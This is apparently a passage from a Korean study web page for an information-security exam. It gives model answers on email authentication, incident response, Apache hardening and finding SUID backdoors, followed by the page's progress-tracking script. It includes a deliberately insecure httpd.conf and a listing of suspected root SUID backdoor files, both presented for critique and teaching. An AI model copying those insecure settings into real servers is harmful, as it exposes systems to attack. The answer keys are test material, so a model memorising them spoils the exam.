허용이다. 공격 유형은 file:// 등을 이용한 정보 노출(및 SSRF)과 재귀 참조로 자원을 고갈시키는 Billion Laughs(DoS)이며, 대응은 외부 엔티티·DTD 비활성화가 핵심이다."},{"num":15,"type":"서술형","points":12,"domain":"정보보안 일반","question":"이메일 발신자 위조를 방지하기 위한 인증 기술에 대하여 다음 물음에 답하시오.\n\n(1) SPF의 동작 원리를 서술하시오. (4점)\n(2) DKIM의 동작 원리를 서술하시오. (4점)\n(3) DMARC가 SPF·DKIM과 어떻게 연계되는지 서술하시오. (4점)","scenario":"","answer":"**(1) SPF (Sender Policy Framework)**\n- 발신 도메인의 DNS에 **허용된 발신 서버 IP를 TXT 레코드로 등록**해 둔다. 수신 서버는 실제 발신 IP가 등록된 IP 목록에 있는지 대조하여 **발신자(도메인) 위조 여부**를 검증한다.\n\n**(2) DKIM (DomainKeys Identified Mail)**\n- 발신 서버가 메일 헤더·본문에 대해 **개인키로 전자서명**을 생성해 첨부한다. 수신 서버는 발신 도메인의 DNS에 공개된 **공개키(TXT)로 서명을 검증**하여 무결성과 발신자 조작 여부를 확인한다.\n\n**(3) DMARC**\n- **SPF와 DKIM의 인증 결과를 종합**하고, 발신 도메인(From) 정렬(alignment)을 확인한다. 인증에 실패한 메일에 대한 **처리 정책(none/quarantine/reject)**과 **결과 리포팅**을 발신 도메인이 지정할 수 있게 한다.","explanation":"SPF는 DNS TXT의 허용 IP로 발신 IP를 대조하고, DKIM은 개인키 서명/공개키 검증으로 무결성을 확인한다. DMARC는 SPF·DKIM 결과를 결합하고 실패 시 정책(격리·거부)과 리포팅을 규정한다는 연계 관계를 서술해야 한다."},{"num":16,"type":"서술형","points":12,"domain":"정보보안 관리 및 법규","question":"침해사고 대응에 대하여 다음 물음에 답하시오.\n\n(1) 침해사고 대응 7단계를 순서대로 쓰시오. (6점)\n(2) 사고 조사 단계에서 증거를 확보할 때 지켜야 할 원칙(수집 순서, 무결성, 연계보관성)을 서술하시오. (6점)","scenario":"","answer":"**(1) 침해사고 대응 7단계**\n- 사고 전 준비 → 사고 탐지 → **초기 대응** → 대응 전략 체계화 → 사고 조사 → 보고서 작성 → 해결(복구)\n\n**(2) 증거 확보 원칙**\n- **휘발성 순서** : 휘발성이 높은 것부터 수집한다(레지스터·캐시 → 메모리 → 네트워크 상태 → 디스크 → 백업 순).\n- **무결성** : 수집 즉시 **해시값을 산출**하고, 이후 값 비교로 위·변조가 없었음을 증명한다.\n- **연계보관성(Chain of Custody)** : 수집→이송→분석→보관→제출 각 단계의 **담당자와 취급 이력을 문서로 기록**하여 증거의 연속성을 보장한다.","explanation":"7단계는 '사고 전 준비 → 탐지 → 초기 대응 → 대응 전략 체계화 → 사고 조사 → 보고서 작성 → 해결(복구)'이다. 증거 확보는 휘발성이 높은 것부터, 해시로 무결성 확보, 연계보관성(취급 이력 문서화)을 지키는 것이 핵심 채점 포인트다."},{"num":17,"type":"실무형","points":16,"domain":"애플리케이션·웹 보안 (아파치 보안 설정 점검)","question":"아래는 어느 아파치(Apache) 웹 서버의 설정 파일(httpd.conf) 일부이다. 보안 관점에서 물음에 답하시오.","scenario":"```\nServerTokens Full\nServerSignature On\n\n<Directory /var/www/html>\n    Options Indexes FollowSymLinks\n    AllowOverride None\n<\/Directory>\n\n<Limit GET POST PUT DELETE>\n    Require all granted\n<\/Limit>\n\nTraceEnable On\n```","answer":"**(1) 보안상 문제가 있는 설정과 이유를 3가지 이상 지적하시오.** (9점)\n- `ServerTokens Full` / `ServerSignature On` : 응답 헤더·에러 페이지에 **서버 종류·버전 등 상세 정보가 노출**되어 공격자에게 정보를 제공한다.\n- `Options Indexes` : index 파일이 없을 때 **디렉터리 목록이 노출**(디렉터리 인덱싱)된다.\n- `Options FollowSymLinks` : 심볼릭 링크를 통해 **웹 루트 밖의 파일에 접근**될 수 있다.\n- `PUT DELETE` 허용 / `TraceEnable On` : **불필요·위험한 HTTP 메서드**가 활성화되어 파일 업로드·삭제, TRACE를 악용한 **XST(교차 사이트 추적)** 공격에 노출된다.\n\n**(2) 위 문제들을 해결하기 위한 설정 변경 방안을 제시하시오.** (7점)\n```\nServerTokens Prod        # 최소 정보만 노출(Apache만 표시)\nServerSignature Off\n\n<Directory /var/www/html>\n    Options -Indexes -FollowSymLinks\n    AllowOverride None\n<\/Directory>\n\n<Limit GET POST>         # 필요한 메서드만 허용\n    Require all granted\n<\/Limit>\n\nTraceEnable Off          # TRACE 비활성화(XST 방지)\n```","explanation":"아파치 보안 점검 실무형은 (1)정보 노출(ServerTokens/Signature) (2)디렉터리 인덱싱(Indexes)·심볼릭 링크(FollowSymLinks) (3)위험 메서드(PUT/DELETE/TRACE) 세 축을 잡는다. `-Indexes -FollowSymLinks`, `ServerTokens Prod`, `TraceEnable Off`, 불필요 메서드 제한이 핵심 조치다."},{"num":18,"type":"실무형","points":16,"domain":"시스템 보안 (SUID 백도어 점검)","question":"침해가 의심되는 리눅스 서버에서 SUID가 설정된 파일을 점검한 결과가 아래와 같다. 물음에 답하시오.","scenario":"```\n# find / -perm -4000 -type f 2>/dev/null\n-rwsr-xr-x 1 root root  /usr/bin/passwd\n-rwsr-xr-x 1 root root  /usr/bin/su\n-rwsr-xr-x 1 root root  /tmp/.sh\n-rwsr-xr-x 1 root root  /var/www/html/upload/cmd\n```","answer":"**(1) `find / -perm -4000`이 찾는 파일이 무엇이며, 왜 점검 대상인지 서술하시오.** (5점)\n- **SUID(Set-UID) 비트가 설정된 파일**을 찾는다. SUID 파일은 실행 시 **실행자가 아니라 파일 소유자(root)의 권한으로 동작**하므로, 악용되면 일반 사용자가 root 권한을 획득(권한 상승)할 수 있어 반드시 점검해야 한다.\n\n**(2) 위 결과에서 의심스러운 파일과 그 이유를 지적하시오.** (6점)\n- `/tmp/.sh` : **임시 디렉터리(/tmp)**에, 이름 앞에 `.`을 붙인 **숨김 파일**로 root SUID 셸이 존재한다. 정상 시스템 바이너리가 아니며, 실행 시 root 셸을 얻는 **백도어**로 강하게 의심된다.\n- `/var/www/html/upload/cmd` : **웹 업로드 디렉터리**에 root SUID 실행 파일이 있다. 파일 업로드 취약점을 통해 심어진 **웹셸/권한상승 백도어**로 의심된다.\n- (`/usr/bin/passwd`, `/usr/bin/su`는 SUID가 정상적으로 필요한 표준 바이너리다.)\n\n**(3) 대응(조치) 방안을 서술하시오.** (5점)\n- 의심 파일의 **SUID 비트 제거**(`chmod -s`) 또는 격리·삭제 후, 무결성 검사(해시·rpm -V 등)로 변조 여부 확인\n- 침입 경로(웹 업로드 취약점 등) 분석 및 차단, 로그·프로세스 조사\n- 불필요한 SUID 파일 정리, `/tmp` 등에 `noexec`·`nosuid` 마운트 옵션 적용","explanation":"`find / -perm -4000`은 SUID 파일을 찾는 표준 점검이다. SUID는 소유자(root) 권한으로 실행되므로 권한 상승에 악용된다. /tmp의 숨김 SUID 셸(.sh)과 웹 업로드 경로의 SUID 실행 파일이 백도어 정황이며, chmod -s·격리, 침입 경로 차단, nosuid 마운트가 대응 포인트다."}]}]};</script>
<script>
(function(){
  "use strict";
  const DATA = window.STUDY_DATA;
  const LS_KEY = "secmaster_done_v1";

  // ── 항목 평탄화 + 고유 id 부여 ──
  const ITEMS = [];
  DATA.forEach((subj,si)=>{
    subj.sections.forEach((sec,ci)=>{
      sec.items.forEach((it,ii)=>{
        it.id = "s"+si+"_"+ci+"_"+ii;
        it.subjNum = subj.num; it.subjTitle = subj.title;
        it.secTitle = sec.title; it._si=si; it._ci=ci;
        ITEMS.push(it);
      });
    });
  });
  document.getElementById("totalCount").textContent = ITEMS.length;

  // ── 진도 저장 ──
  let done = {};
  try{ done = JSON.parse(localStorage.getItem(LS_KEY)||"{}"); }catch(e){ done={}; }
  function save(){ try{ localStorage.setItem(LS_KEY, JSON.stringify(done)); }catch(e){} }
  function isDone(id){ return !!done[id]; }
  function toggleDone(id){ if(done[id]) delete done[id]; else done[id]=1; save(); updateProgress(); }

  function updateProgress(){
    const total = ITEMS.length;
    const d = ITEMS.filter(it=>isDone(it.id)).length;
    const pct = total? Math.round(d/total*100):0;
    document.getElementById("progBar").style.width = pct+"%";
    document.getElementById("progTxt").textContent = pct+"% ("+d+"/"+total+")";
    // 섹션 카운트 갱신
    document.querySelectorAll(".sec-btn").forEach(b=>{
      const si=+b.dataset.si, ci=+b.dataset.ci;
      const items = DATA[si].sections[ci].items;
      const dn = items.filter(it=>isDone(it.id)).length;
      const el = b.querySelector(".sc");
      if(el){ el.textContent = dn+"/"+items.length; el.style.color = dn===items.length? "var(--done)":""; }
    });
  }

  // ── 상태 ──
  const state = { mode:"browse", si:0, ci:0, viewAll:false, search:"", filters:{star:false,add:false,todo:false}, flashIdx:0, flashList:[] };

  // ── 마크다운 → HTML (경량) ──
  function esc(s){ return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
  function inlineMd(s){
    // 코드 우선 보호
    const codes=[]; s=s.replace(/`([^`]+)`/g,(m,c)=>{ codes.push(c); return "\u0000"+(codes.length-1)+"\u0000"; });
    s=esc(s);
    s=s.replace(/\*\*([^*]+)\*\*/g,"<strong>$1</strong>");
    s=s.replace(/\u0000(\d+)\u0000/g,(m,i)=>"<code>"+esc(codes[+i])+"</code>");
    return s;
  }
  function renderMd(src){
    const lines = src.replace(/\r/g,"").split("\n");
    let html="", i=0;
    function listBlock(baseIndent){
      let out="<ul>"; 
      while(i<lines.length){
        const raw=lines[i];
        const m=raw.match(/^(\s*)[-*]\s+(.*)$/);
        if(!m) break;
        const indent=m[1].length;
        if(indent<baseIndent) break;
        if(indent>baseIndent){ // 중첩
          const sub=listBlock(indent); out=out.replace(/<\/li>$/,"")+sub+"</li>"; continue;
        }
        i++;
        let li="<li>"+inlineMd(m[2]);
        // 연속 중첩 리스트 처리
        if(i<lines.length){
          const nm=lines[i].match(/^(\s*)[-*]\s+/);
          if(nm && nm[1].length>indent){ li+=listBlock(nm[1].length); }
        }
        out+=li+"</li>";
      }
      return out+"</ul>";
    }
    while(i<lines.length){
      const line=lines[i];
